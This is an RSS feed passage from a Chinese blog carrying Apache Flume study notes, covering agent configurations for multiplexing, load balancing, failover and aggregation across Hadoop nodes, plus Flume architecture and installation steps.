class-name">Builder</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor<span class="token punctuation">.</span>Builder</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CustomInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）编辑flume配置文件</p><p>为hadoop102上的Flume1配置1个netcat source，1个sink group（2个avro sink），并配置相应的ChannelSelector和interceptor。根据下面的配置，head里是letter就放c1,header是number就放c2。</p><p>a1.sources.r1.selector.mapping.letter = c1</p><p>a1.sources.r1.selector.mapping.number = c2</p><p>完整配置如下：</p><pre><code># Name the components on this agenta1.sources = r1a1.sinks = k1 k2a1.channels = c1 c2# Describe/configure the sourcea1.sources.r1.type = netcata1.sources.r1.bind = localhosta1.sources.r1.port = 44444a1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = com.atguigu.flume.interceptor.CustomInterceptor$Buildera1.sources.r1.selector.type = multiplexinga1.sources.r1.selector.header = typea1.sources.r1.selector.mapping.letter = c1a1.sources.r1.selector.mapping.number = c2# Describe the sinka1.sinks.k1.type = avroa1.sinks.k1.hostname = hadoop103a1.sinks.k1.port = 4141a1.sinks.k2.type=avroa1.sinks.k2.hostname = hadoop104a1.sinks.k2.port = 4242# Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Use a channel which buffers events in memorya1.channels.c2.type = memorya1.channels.c2.capacity = 1000a1.channels.c2.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1 c2a1.sinks.k1.channel = c1a1.sinks.k2.channel = c2</code></pre><p>为hadoop103上的Flume4配置一个avro source和一个logger sink。</p><pre class="line-numbers language-bash"><code class="language-bash">a1.sources <span class="token operator">=</span> r1a1.sinks <span class="token operator">=</span> k1a1.channels <span class="token operator">=</span> c1a1.sources.r1.type <span class="token operator">=</span> avroa1.sources.r1.bind <span class="token operator">=</span> hadoop103a1.sources.r1.port <span class="token operator">=</span> 4141a1.sinks.k1.type <span class="token operator">=</span> loggera1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sources.r1.channels <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为hadoop104上的Flume3配置一个avro source和一个logger sink。</p><pre class="line-numbers language-bash"><code class="language-bash">a1.sources <span class="token operator">=</span> r1a1.sinks <span class="token operator">=</span> k1a1.channels <span class="token operator">=</span> c1a1.sources.r1.type <span class="token operator">=</span> avroa1.sources.r1.bind <span class="token operator">=</span> hadoop104a1.sources.r1.port <span class="token operator">=</span> 4242a1.sinks.k1.type <span class="token operator">=</span> loggera1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sources.r1.channels <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）分别在hadoop102，hadoop103，hadoop104上启动flume进程，注意先后顺序。</p><p>（5）在hadoop102使用netcat向localhost:44444发送字母和数字。</p><p>（6）观察hadoop103和hadoop104打印的日志。</p><h3 id="4-3-负载均衡"><a href="#4-3-负载均衡" class="headerlink" title="4.3 负载均衡"></a>4.3 负载均衡</h3><p>负载均衡片处理器提供在多个Sink之间负载平衡的能力。实现支持通过<strong>round_robin（轮询）或者random（随机）</strong>参数来实现负载分发</p><p><strong>默认情况下使用round_robin</strong>，但可以通过配置覆盖这个默认值。还可以通过集成AbstractSinkSelector类来实现用户自己的选择机制。</p><p>当被调用的时候，这选择器通过配置的选择规则选择下一个sink来调用。</p><p>1）案例需求</p><p>使用Flume1监控一个端口，将监控到的内容通过轮询或者随机的方式给到flume2和flume3。Flume2和Flume3将内容打印到控制台。这个时候需要使用LoadBalancingSinkProcessor。</p><p>2）架构分析：</p><p>具体架构选择见下图。</p><p><img src="/2020/11/15/bigdata-flume2-framework/1637067365266.png" alt="1637067365266"></p><p>3）实现步骤</p><p>（1）准备工作</p><p>在/opt/module/flume/job目录下创建group3文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ <span class="token function">cd</span> group3/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）创建flume-netcat-flume.conf：flume1的配置</p><p>配置1个netcat source和1个channel、1个sink group（2个sink），分别输送给flume-flume-console2和flume-flume-console3。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#负载均衡</span><span class="token comment" spellcheck="true">#配置Agent a1的组件</span>a1.sources<span class="token operator">=</span>r1a1.channels<span class="token operator">=</span>c1a1.sinks<span class="token operator">=</span>s1 s2<span class="token comment" spellcheck="true">#配置a1的source</span>a1.sources.r1.type<span class="token operator">=</span>netcata1.sources.r1.bind<span class="token operator">=</span>0.0.0.0a1.sources.r1.port<span class="token operator">=</span>3333<span class="token comment" spellcheck="true">##配置a1的channel</span>a1.channels.c1.type<span class="token operator">=</span>memorya1.channels.c1.capacity<span class="token operator">=</span>1000a1.channels.c1.trancactionCapacity<span class="token operator">=</span>100<span class="token comment" spellcheck="true">#配置a1的sink</span>a1.sinks.s1.type<span class="token operator">=</span>avroa1.sinks.s1.hostname<span class="token operator">=</span>node2a1.sinks.s1.port<span class="token operator">=</span>8888a1.sinks.s2.type<span class="token operator">=</span>avroa1.sinks.s2.hostname<span class="token operator">=</span>node3a1.sinks.s2.port<span class="token operator">=</span>8888<span class="token comment" spellcheck="true">#配置sink组以及sink处理器运行</span>a1.sinkgroups <span class="token operator">=</span> g1a1.sinkgroups.g1.sinks <span class="token operator">=</span> s1 s2a1.sinkgroups.g1.processor.type <span class="token operator">=</span> load_balancea1.sinkgroups.g1.processor.backoff <span class="token operator">=</span> <span class="token boolean">true</span><span class="token comment" spellcheck="true">#参数可选round_robin（轮询）或者random（随机）</span>a1.sinkgroups.g1.processor.selector <span class="token operator">=</span> round_robin<span class="token comment" spellcheck="true">#绑定</span>a1.sources.r1.channels<span class="token operator">=</span>c1a1.sinks.s1.channel<span class="token operator">=</span>c1a1.sinks.s2.channel<span class="token operator">=</span>c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）flume2和flume3的配置：两个配置是一样的.flume-flume-console2，flume-flume-console1</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 配置Agent a1的组件</span>a1.sources<span class="token operator">=</span>r1a1.channels<span class="token operator">=</span>c1a1.sinks<span class="token operator">=</span>s1<span class="token comment" spellcheck="true"># 配置a1的source</span>a1.sources.r1.type<span class="token operator">=</span>avroa1.sources.r1.bind<span class="token operator">=</span>0.0.0.0a1.sources.r1.port<span class="token operator">=</span>8888<span class="token comment" spellcheck="true"># 配置a1的channel</span>a1.channels.c1.type<span class="token operator">=</span>memory<span class="token comment" spellcheck="true"># 配置a1的sink</span>a1.sinks.s1.type<span class="token operator">=</span>logger<span class="token comment" spellcheck="true"># 绑定</span>a1.sources.r1.channels<span class="token operator">=</span>c1a1.sinks.s1.channel<span class="token operator">=</span>c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）执行配置文件</p><p>分别开启对应配置文件：flume-flume-console2，flume-flume-console1，flume-netcat-flume。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group2/flume-flume-console2.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group2/flume-flume-console1.conf -Dflume.root.logger<span class="token operator">=</span>INFO,console<span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group2/flume-netcat-flume.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（6）使用netcat工具向本机的44444端口发送内容</p><pre class="line-numbers language-bash"><code class="language-bash">$ nc localhost 44444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（7）查看Flume2及Flume3的控制台打印日志</p><h3 id="4-4-故障转移"><a href="#4-4-故障转移" class="headerlink" title="4.4 故障转移"></a>4.4 故障转移</h3><p>1）案例需求</p><p>使用Flume1监控一个端口，其sink组中的sink分别对接Flume2和Flume3，采用FailoverSinkProcessor，实现故障转移的功能。</p><p><strong>2）需求分析</strong></p><p><img src="/2020/11/15/bigdata-flume2-framework/1637067455399.png" alt="1637067455399"></p><p><img src="/2020/11/15/bigdata-flume2-framework/1637116934865.png" alt="1637116934865">3）实现步骤</p><p>（1）准备工作</p><p>在/opt/module/flume/job目录下创建group2文件夹</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 job<span class="token punctuation">]</span>$ <span class="token function">cd</span> group2/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）创建flume-netcat-flume.conf</p><p>配置1个netcat source和1个channel、1个sink group（2个sink），分别输送给flume-flume-console1和flume-flume-console2。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group2<span class="token punctuation">]</span>$ vim flume-netcat-flume.conf<span class="token comment" spellcheck="true">#添加如下内容</span><span class="token comment" spellcheck="true"># Name the components on this agent</span>a1.sources <span class="token operator">=</span> r1a1.channels <span class="token operator">=</span> c1a1.sinkgroups <span class="token operator">=</span> g1a1.sinks <span class="token operator">=</span> k1 k2<span class="token comment" spellcheck="true"># Describe/configure the source</span>a1.sources.r1.type <span class="token operator">=</span> netcata1.sources.r1.bind <span class="token operator">=</span> localhosta1.sources.r1.port <span class="token operator">=</span> 44444<span class="token comment" spellcheck="true">#设置sinkgroups processor为failover</span>a1.sinkgroups.g1.processor.type <span class="token operator">=</span> failover<span class="token comment" spellcheck="true">#两个sink，k1与k2,其中2个优先级是5和10</span>a1.sinkgroups.g1.processor.priority.k1 <span class="token operator">=</span> 5a1.sinkgroups.g1.processor.priority.k2 <span class="token operator">=</span> 10<span class="token comment" spellcheck="true">#failover time的上限可以通过maxpenalty 属性来进行设置默认10s。</span>a1.sinkgroups.g1.processor.maxpenalty <span class="token operator">=</span> 10000<span class="token comment" spellcheck="true"># Describe the sink</span>a1.sinks.k1.type <span class="token operator">=</span> avroa1.sinks.k1.hostname <span class="token operator">=</span> hadoop102a1.sinks.k1.port <span class="token operator">=</span> 4141a1.sinks.k2.type <span class="token operator">=</span> avroa1.sinks.k2.hostname <span class="token operator">=</span> hadoop102a1.sinks.k2.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the channel</span>a1.channels.c1.type <span class="token operator">=</span> memorya1.channels.c1.capacity <span class="token operator">=</span> 1000a1.channels.c1.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a1.sources.r1.channels <span class="token operator">=</span> c1a1.sinkgroups.g1.sinks <span class="token operator">=</span> k1 k2a1.sinks.k1.channel <span class="token operator">=</span> c1a1.sinks.k2.channel <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）创建flume-flume-console1.conf</p><p>配置上级Flume输出的Source，输出是到本地控制台。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group2<span class="token punctuation">]</span>$ vim flume-flume-console1.conf<span class="token comment" spellcheck="true">#添加如下内容</span><span class="token comment" spellcheck="true"># Name the components on this agent</span>a2.sources <span class="token operator">=</span> r1a2.sinks <span class="token operator">=</span> k1a2.channels <span class="token operator">=</span> c1<span class="token comment" spellcheck="true"># Describe/configure the source</span>a2.sources.r1.type <span class="token operator">=</span> avroa2.sources.r1.bind <span class="token operator">=</span> hadoop102a2.sources.r1.port <span class="token operator">=</span> 4141<span class="token comment" spellcheck="true"># Describe the sink</span>a2.sinks.k1.type <span class="token operator">=</span> logger<span class="token comment" spellcheck="true"># Describe the channel</span>a2.channels.c1.type <span class="token operator">=</span> memorya2.channels.c1.capacity <span class="token operator">=</span> 1000a2.channels.c1.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a2.sources.r1.channels <span class="token operator">=</span> c1a2.sinks.k1.channel <span class="token operator">=</span> c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（4）创建flume-flume-console2.conf</p><p>配置上级Flume输出的Source，输出是到本地控制台。</p><p>编辑配置文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 group2<span class="token punctuation">]</span>$ vim flume-flume-console2.conf添加如下内容<span class="token comment" spellcheck="true"># Name the components on this agent</span>a3.sources <span class="token operator">=</span> r1a3.sinks <span class="token operator">=</span> k1a3.channels <span class="token operator">=</span> c2<span class="token comment" spellcheck="true"># Describe/configure the source</span>a3.sources.r1.type <span class="token operator">=</span> avroa3.sources.r1.bind <span class="token operator">=</span> hadoop102a3.sources.r1.port <span class="token operator">=</span> 4142<span class="token comment" spellcheck="true"># Describe the sink</span>a3.sinks.k1.type <span class="token operator">=</span> logger<span class="token comment" spellcheck="true"># Describe the channel</span>a3.channels.c2.type <span class="token operator">=</span> memorya3.channels.c2.capacity <span class="token operator">=</span> 1000a3.channels.c2.transactionCapacity <span class="token operator">=</span> 100<span class="token comment" spellcheck="true"># Bind the source and sink to the channel</span>a3.sources.r1.channels <span class="token operator">=</span> c2a3.sinks.k1.channel <span class="token operator">=</span> c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（5）执行配置文件</p><p>分别开启对应配置文件：flume-flume-console2，flume-flume-console1，flume-netcat-flume。</p><pre><code>[molly@hadoop102 flume]$ bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group2/flume-flume-console2.conf -Dflume.root.logger=INFO,console[molly@hadoop102 flume]$ bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group2/flume-flume-console1.conf -Dflume.root.logger=INFO,console[molly@hadoop102 flume]$ bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group2/flume-netcat-flume.conf</code></pre><p>（6）使用netcat工具向本机的44444端口发送内容</p><pre><code>$ nc localhost 44444</code></pre><p>（7）查看Flume2及Flume3的控制台打印日志</p><p> <strong>因为k1的优先级是5，K2是10因此当K2正常运行的时候，是发送到K2的</strong>。 </p><p>（8）将Flume2 kill，观察Flume3的控制台打印情况。</p><p>我们发现源代理发生事件到K2失败，然后他将K2放入到failover list（故障列表）</p><p>因为K1还是正常运行的，因此这个时候他会接收到数据。</p><p>注：使用jps -ml查看Flume进程。</p><h3 id="4-5聚合"><a href="#4-5聚合" class="headerlink" title="4.5聚合"></a>4.5聚合</h3><p>1）案例需求：</p><p>hadoop102上的Flume-1监控文件/opt/module/group.log，</p><p>hadoop103上的Flume-2监控某一个端口的数据流，</p><p>Flume-1与Flume-2将数据发送给hadoop104上的Flume-3，Flume-3将最终数据打印到控制台。</p><p>2）需求分析</p><p><strong><img src="/2020/11/15/bigdata-flume2-framework/clip_image008.png" alt="img"></strong></p><p>3）实现步骤：</p><p>（1）准备工作</p><p>分发Flume</p><p>[molly@hadoop102 module]$ xsync flume</p><p>在hadoop102、hadoop103以及hadoop104的/opt/module/flume/job目录下创建一个group3文件夹。</p><p>[molly@hadoop102 job]$ mkdir group3</p><p>[molly@hadoop103 job]$ mkdir group3</p><p>[molly@hadoop104 job]$ mkdir group3</p><p>（2）创建flume1-logger-flume.conf</p><p>配置Source用于监控hive.log文件，配置Sink输出数据到下一级Flume。</p><p>在hadoop102上编辑配置文件</p><p>[molly@hadoop102 group3]$ vim flume1-logger-flume.conf </p><p>添加如下内容</p><p># Name the components on this agent</p><p>a1.sources = r1</p><p>a1.sinks = k1</p><p>a1.channels = c1</p><p># Describe/configure the source</p><p>a1.sources.r1.type = exec</p><p>a1.sources.r1.command = tail -F /opt/module/group.log</p><p>a1.sources.r1.shell = /bin/bash -c</p><p># Describe the sink</p><p>a1.sinks.k1.type = avro</p><p>a1.sinks.k1.hostname = hadoop104</p><p>a1.sinks.k1.port = 4141</p><p># Describe the channel</p><p>a1.channels.c1.type = memory</p><p>a1.channels.c1.capacity = 1000</p><p>a1.channels.c1.transactionCapacity = 100</p><p># Bind the source and sink to the channel</p><p>a1.sources.r1.channels = c1</p><p>a1.sinks.k1.channel = c1</p><p>（3）创建flume2-netcat-flume.conf</p><p>配置Source监控端口44444数据流，配置Sink数据到下一级Flume：</p><p>在hadoop103上编辑配置文件</p><p>[molly@hadoop102 group3]$ vim flume2-netcat-flume.conf</p><p>添加如下内容</p><p># Name the components on this agent</p><p>a2.sources = r1</p><p>a2.sinks = k1</p><p>a2.channels = c1</p><p># Describe/configure the source</p><p>a2.sources.r1.type = netcat</p><p>a2.sources.r1.bind = hadoop103</p><p>a2.sources.r1.port = 44444</p><p># Describe the sink</p><p>a2.sinks.k1.type = avro</p><p>a2.sinks.k1.hostname = hadoop104</p><p>a2.sinks.k1.port = 4141</p><p># Use a channel which buffers events in memory</p><p>a2.channels.c1.type = memory</p><p>a2.channels.c1.capacity = 1000</p><p>a2.channels.c1.transactionCapacity = 100</p><p># Bind the source and sink to the channel</p><p>a2.sources.r1.channels = c1</p><p>a2.sinks.k1.channel = c1</p><p>（4）创建flume3-flume-logger.conf</p><p>配置source用于接收flume1与flume2发送过来的数据流，最终合并后sink到控制台。</p><p>在hadoop104上编辑配置文件</p><p>[molly@hadoop104 group3]$ touch flume3-flume-logger.conf</p><p>[molly@hadoop104 group3]$ vim flume3-flume-logger.conf</p><p>添加如下内容</p><p># Name the components on this agent</p><p>a3.sources = r1</p><p>a3.sinks = k1</p><p>a3.channels = c1</p><p># Describe/configure the source</p><p>a3.sources.r1.type = avro</p><p>a3.sources.r1.bind = hadoop104</p><p>a3.sources.r1.port = 4141</p><p># Describe the sink</p><p># Describe the sink</p><p>a3.sinks.k1.type = logger</p><p># Describe the channel</p><p>a3.channels.c1.type = memory</p><p>a3.channels.c1.capacity = 1000</p><p>a3.channels.c1.transactionCapacity = 100</p><p># Bind the source and sink to the channel</p><p>a3.sources.r1.channels = c1</p><p>a3.sinks.k1.channel = c1</p><p>（5）执行配置文件</p><p>分别开启对应配置文件：flume3-flume-logger.conf，flume2-netcat-flume.conf，flume1-logger-flume.conf。</p><p>[molly@hadoop104 flume]$ bin/flume-ng agent –conf conf/ –name a3 –conf-file job/group3/flume3-flume-logger.conf -Dflume.root.logger=INFO,console</p><p>[molly@hadoop102 flume]$ bin/flume-ng agent –conf conf/ –name a2 –conf-file job/group3/flume1-logger-flume.conf</p><p>[molly@hadoop103 flume]$ bin/flume-ng agent –conf conf/ –name a1 –conf-file job/group3/flume2-netcat-flume.conf</p><p>（6）在hadoop103上向/opt/module目录下的group.log追加内容</p><p>[molly@hadoop103 module]$ echo ‘hello’ &gt; group.log</p><p>（7）在hadoop102上向44444端口发送数据</p><p>[molly@hadoop102 flume]$ telnet hadoop102 44444</p><p>（8）检查hadoop104上数据</p><p><strong><img src="file:///C:/Users/MENGLI~1.ZHA/AppData/Local/Temp/msohtmlclip1/01/clip_image010.png" alt="1528770881(bigdata-flume2-framework/clip_image010.png)"></strong></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/flume/">flume</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-flume2-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>flume学习笔记（一） flume搭建</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-flume1-setup/</guid>
      <pubDate>Sun, 15 Nov 2020 07:46:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前面我们学习到hadoop主要用于大数据的存储和计算；Hive提供更方便的数据分析能力；那有没有想过研究大数据，我们想想大数据是从哪里来的呢？这篇我们学习flume框架，用于数据采集的，并且采集的类型是日志（业务服务的行为数据）；所以<strong>flume就是将服务生产的日志自动实时的搬运（传输）到hdfs上。</strong></p><h2 id="1-1-Flume定义"><a href="#1-1-Flume定义" class="headerlink" title="1.1 Flume定义"></a>1.1 Flume定义</h2><p><a href="https://flume.apache.org/">Flume</a>是Cloudera提供的一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统。Flume基于流式架构，灵活简单。</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637056045712.png" alt="1637056045712"></p><p><strong>Flume最主要的作用就是：实时读取服务器本地磁盘文件夹（或者日志服务器的日志）的日志/数据，然后将数据上传到hdfs中。</strong></p><h2 id="1-2-Flume基础架构"><a href="#1-2-Flume基础架构" class="headerlink" title="1.2 Flume基础架构"></a>1.2 Flume基础架构</h2><p>Flume组成架构如下图所示。</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637056457927.png" alt="1637056457927"></p><p>数据来源：从日志服务器</p><p>数据到哪里：hdfs</p><h3 id="1-2-1-Agent"><a href="#1-2-1-Agent" class="headerlink" title="1.2.1 Agent"></a>1.2.1 Agent</h3><p>Agent是一个JVM进程，它以事件的形式将数据从源头送至目的。</p><p>Agent主要有3个部分组成，Source、Channel、Sink。</p><h3 id="1-2-2-Source"><a href="#1-2-2-Source" class="headerlink" title="1.2.2 Source"></a>1.2.2 Source</h3><p>Source是负责<strong>接收数据</strong>到Flume Agent的组件。Source组件可以处理各种类型、各种格式的日志数据，包括avro、thrift、exec、jms、spooling directory、netcat、 taildir 、sequence generator、syslog、http、legacy。</p><h3 id="1-2-3-Sink"><a href="#1-2-3-Sink" class="headerlink" title="1.2.3 Sink"></a>1.2.3 Sink</h3><p>Sink不断地轮询Channel中的事件且<strong>批量地移除</strong>它们，并将这些事件<strong>批量写入到存储或索引系统</strong>、或者被发送到另一个Flume Agent。</p><p>Sink组件目的地包括hdfs、logger、avro、thrift、ipc、file、HBase、solr、自定义。</p><h3 id="1-2-4-Channel"><a href="#1-2-4-Channel" class="headerlink" title="1.2.4 Channel"></a>1.2.4 Channel</h3><p>Channel是位于Source和Sink之间的<strong>缓冲区</strong>。因此，Channel允许Source和Sink运作在不同的速率上。<strong>Channel是线程安全的，可以同时处理几个Source的写入操作和几个Sink的读取操作</strong>(有可能一个chanel对应多个source和多个sink)。</p><p><strong>Flume自带两种Channel：Memory Channel和File Channel。</strong></p><p>Memory Channel是内存中的队列。Memory Channel在不需要关心数据丢失的情景下适用。如果需要关心数据丢失，那么Memory Channel就不应该使用，因为程序死亡、机器宕机或者重启都会导致数据丢失。</p><p>File Channel将所有事件写到磁盘。因此在程序关闭或机器宕机的情况下不会丢失数据。</p><h3 id="1-2-5-Event"><a href="#1-2-5-Event" class="headerlink" title="1.2.5 Event"></a>1.2.5 Event</h3><p><strong>传输单元，Flume数据传输的基本单元</strong>，以Event的形式将数据从源头送至目的地。Event由Header和Body两部分组成，Header用来存放该event的一些属性，为K-V结构（通常是没有数据的），Body用来存放该条数据，形式为字节数组。</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637056654444.png" alt="1637056654444"></p><h1 id="2-Flume入门"><a href="#2-Flume入门" class="headerlink" title="2 Flume入门"></a>2 Flume入门</h1><h2 id="2-1-Flume安装部署"><a href="#2-1-Flume安装部署" class="headerlink" title="2.1 Flume安装部署"></a>2.1 Flume安装部署</h2><h3 id="2-1-1-安装地址"><a href="#2-1-1-安装地址" class="headerlink" title="2.1.1 安装地址"></a>2.1.1 安装地址</h3><p>（1）Flume官网地址：<a href="http://flume.apache.org/">http://flume.apache.org/</a></p><p>（2）文档查看地址：<a href="http://flume.apache.org/FlumeUserGuide.html">http://flume.apache.org/FlumeUserGuide.html</a></p><p>（3）下载地址：<a href="http://archive.apache.org/dist/flume/">http://archive.apache.org/dist/flume/</a></p><h3 id="2-1-2-安装部署"><a href="#2-1-2-安装部署" class="headerlink" title="2.1.2 安装部署"></a>2.1.2 安装部署</h3><p>（1）将apache-flume-1.9.0-bin.tar.gz上传到linux的/opt/software目录下</p><p>（2）解压apache-flume-1.9.0-bin.tar.gz到/opt/module/目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxf /opt/software/apache-flume-1.9.0-bin.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）修改apache-flume-1.9.0-bin的名称为flume-1.9.0</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ <span class="token function">mv</span> /opt/module/apache-flume-1.9.0-bin /opt/module/flume<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）将lib文件夹下的guava-11.0.2.jar删除以兼容Hadoop 3.1.3</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 lib<span class="token punctuation">]</span>$ <span class="token function">rm</span> /opt/module/flume/lib/guava-11.0.2.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-2-Flume入门案例"><a href="#2-2-Flume入门案例" class="headerlink" title="2.2 Flume入门案例"></a>2.2 Flume入门案例</h2><h3 id="2-2-1-监控端口数据官方案例"><a href="#2-2-1-监控端口数据官方案例" class="headerlink" title="2.2.1 监控端口数据官方案例"></a>2.2.1 监控端口数据官方案例</h3><p>1）案例需求：</p><p>使用Flume监听一个端口4444，收集该端口数据，并打印到控制台。 </p><p>2）需求分析：</p><p><img src="/2020/11/15/bigdata-flume1-setup/1637055202443.png" alt="1637055202443"></p><p><img src="/2020/11/15/bigdata-flume1-setup/1637057440088.png" alt="1637057440088"></p><p>source端：选用netcat TCP</p><p>Channel：memory channel</p><p>sink：选用logger sink</p><p>3）实现步骤：</p><p>（1）安装netcat工具(man nc 查看手册)</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> yum <span class="token function">install</span> -y nc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）判断44444端口是否被占用</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume-telnet<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">netstat</span> -nlp <span class="token operator">|</span> <span class="token function">grep</span> 44444<span aria-hidden="true" 